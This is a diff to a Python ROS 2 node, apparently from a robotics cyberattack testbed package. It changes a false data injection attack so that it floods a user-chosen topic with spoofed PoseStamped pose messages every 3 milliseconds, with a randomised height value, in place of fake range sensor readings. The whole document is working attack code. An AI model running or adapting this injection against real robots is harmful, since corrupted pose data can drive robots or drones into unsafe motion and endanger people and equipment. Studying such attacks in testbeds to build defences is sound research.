@@ -1,10 +1,9 @@
-import rclpy, sys, os
+import rclpy, sys
 from rclpy.node import Node, NodeNameNonExistentError
-from roboticpark_cyberattacks.utils import rslg, printargs, import_message_type
+from roboticpark_cyberattacks.utils import rslg, printargs
 from rcl_interfaces.srv import *
 from std_srvs.srv import Trigger
-from multiprocessing import Pool
-from sensor_msgs.msg import Range
+from geometry_msgs.msg import PoseStamped
 import random, time
 import threading
 
@@ -16,6 +15,14 @@ class fdianode(Node):
     publisher = None
     frameid = None
     continueAttack = False
+    posx=0.0
+    posy=0.0
+    posz=0.0
+    orx=0.0
+    ory=0.0
+    orz=0.0
+    orw=0.0
+    
 
     def __init__(self):
         super().__init__("fdianode")
@@ -23,11 +30,28 @@ class fdianode(Node):
         self.declare_parameter('fdia_frame_id', "Unset")
         self.declare_parameter('fdia_range_start',0.0)
         self.declare_parameter('fdia_range_end', 0.0)
-        printargs(self)
+        self.declare_parameter('fdia_posx', 0.0)
+        self.declare_parameter('fdia_posy', 0.0)
+        self.declare_parameter('fdia_posz', 0.0)
+        self.declare_parameter('fdia_orx', 0.0)
+        self.declare_parameter('fdia_ory', 0.0)
+        self.declare_parameter('fdia_orz', 0.0)
+        self.declare_parameter('fdia_orw', 0.0)
+      
         self.topic= self.get_parameter('fdia_topic').get_parameter_value().string_value
         self.frameid= self.get_parameter('fdia_frame_id').get_parameter_value().string_value
         self.rangeStart= self.get_parameter('fdia_range_start').get_parameter_value().double_value
         self.rangeEnd= self.get_parameter('fdia_range_end').get_parameter_value().double_value
+        self.posx= self.get_parameter('fdia_posx').get_parameter_value().double_value
+        self.posy= self.get_parameter('fdia_posy').get_parameter_value().double_value
+        self.posz= self.get_parameter('fdia_posz').get_parameter_value().double_value
+        self.orx= self.get_parameter('fdia_orx').get_parameter_value().double_value
+        self.ory= self.get_parameter('fdia_ory').get_parameter_value().double_value
+        self.orz= self.get_parameter('fdia_orz').get_parameter_value().double_value
+        self.orw= self.get_parameter('fdia_orw').get_parameter_value().double_value
+
+        printargs(self)
+
         rslg(self,f'{self.rangeStart} {self.rangeEnd}')
  
         if self.topic == 'Unset' or self.rangeStart == 0 or self.rangeEnd == 0 or self.frameid == "Unset":
@@ -56,7 +80,7 @@ class fdianode(Node):
 
     def fdiainject(self):
         """This function  injects messagges into one topic, decided by the user who invokes the node
-        However, this function is no portable. It will send always the same type of message: sensor_msgs/msg/Range
+        However, this function is no portable. It will send always the same type of message: geometry_msgs/PoseStamped Message
 
         Parameters:
 
@@ -65,36 +89,49 @@ class fdianode(Node):
         data example: 
                     ---
                     header:
-                    stamp:
-                        sec: 0
-                        nanosec: 0
-                    frame_id: range_left
-                    radiation_type: 1
-                    field_of_view: 1.5707999467849731
-                    min_range: 0.0
-                    max_range: 2.0
-                    range: 1.470906376838684
+                        stamp:
+                            sec: 1731787676
+                            nanosec: 314306003
+                        frame_id: map
+                    pose:
+                        position:
+                            x: 0.815548477931251
+                            y: -0.7515952102717546
+                            z: 0.6082673520391061
+                        orientation:
+                            x: -0.0006039200934903616
+                            y: 0.0009935296803737891
+                            z: 0.0011008786532515124
+                            w: 0.9999987181219213
+
                     ---
 
         """
-        rslg(self,f'Launching random false data into measures')
+        rslg(self,f'Launching random false data into pose measures')
 
         self.continueAttack = True
-        self.publisher = self.create_publisher(Range,self.topic,10)
+        self.publisher = self.create_publisher(PoseStamped,self.topic,10)
 
         while self.continueAttack:
-            time.sleep(0.006)
-            msg = Range() 
-            msg.header.frame_id = 'range_left'
-            
-            msg.radiation_type = Range.INFRARED   
-            msg.field_of_view = 1.57  
-            msg.min_range = 0.0  
-            msg.max_range = 2.0  
-            msg.range = random.uniform(self.rangeStart, self.rangeEnd)
-            rslg(self,f'{msg.range}')
+            time.sleep(0.003)
+            pose_msg = PoseStamped() 
 
-            self.publisher.publish(msg)
+            pose_msg.header.stamp = self.get_clock().now().to_msg()  
+            pose_msg.header.frame_id = self.frameid
+
+            pose_msg.pose.position.x = self.posx
+            pose_msg.pose.position.y = self.posy
+            pose_msg.pose.position.z = self.posz+random.uniform(self.rangeStart, self.rangeEnd)
+
+            pose_msg.pose.orientation.x = self.orx
+            pose_msg.pose.orientation.y = self.ory
+            pose_msg.pose.orientation.z = self.orz
+            pose_msg.pose.orientation.w = self.orw
+
+
+            rslg(self,f'{pose_msg}')
+
+            self.publisher.publish(pose_msg)
 
 
     def stopfdiainject(self, request,response):
